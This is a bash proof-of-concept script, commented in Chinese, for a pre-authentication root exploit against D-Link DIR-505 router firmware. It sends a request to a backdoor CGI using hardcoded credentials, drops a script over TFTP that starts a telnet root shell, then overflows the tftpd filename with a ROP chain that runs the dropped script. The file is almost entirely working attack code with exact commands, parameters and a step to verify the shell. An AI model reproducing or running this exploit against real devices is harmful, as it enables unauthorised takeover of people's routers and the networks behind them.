#!/bin/bash
# =============================================================================
# DIR-505 A1 FW110B02 — pre-auth RCE PoC（tftpd 文件名栈溢出 ROP）
# 链: 后门触发 → 任意文件写投放脚本 → ROP: system("sh</tmp/ropx") → root shell
# 用法: ./poc_rop_rce.sh <device> <libputil_base> [shell_port] [tftp_port]
#   例: ./poc_rop_rce.sh 192.168.0.1 0x7724d000 2444
# =============================================================================
DEV=${1:?usage: $0 <device> <libputil_base> [shell_port] [tftp_port]}
BASE=${2:?need libputil base, e.g. 0x7724d000}
SHELLPORT=${3:-2444}
PORT=${4:-69}
IP="${DEV%%:*}"
HERE=$(cd "$(dirname "$0")" && pwd)

echo "[0] 触发后门（幂等；确保 tftpd 在跑）"
curl -s -m 10 -X POST "http://$DEV/secmark1524.cgi" \
  --data "accu=mp1524&pass=kmark43&code=smpwdc&hash=/lJ9NwfO3rRGcAkzv49mmA1&cmds=dGZ0cGQ=" ; echo

echo "[1] 任意文件写：投放脚本 /tmp/ropx"
printf 'telnetd -p %s -l /bin/sh\necho MANUAL_ROP_OK>/tmp/rc_proof\n' "$SHELLPORT" > /tmp/ropx_script
python3 "$HERE/tftp_client.py" put "$IP" /tmp/ropx_script ropx "$PORT"

echo "[2] ROP 载荷：system(\"sh</tmp/ropx\")"
python3 "$HERE/gen_tftpd_rop.py" "$BASE" "sh</tmp/ropx" /tmp/rop_fname.hex >/dev/null
echo X > /tmp/rop_dummy
python3 "$HERE/tftp_client.py" put "$IP" /tmp/rop_dummy "hex:$(cat /tmp/rop_fname.hex)" "$PORT"

echo "[3] 验证："
echo "    nc $IP $SHELLPORT        # root shell"
echo "    控制台: cat /tmp/rc_proof"
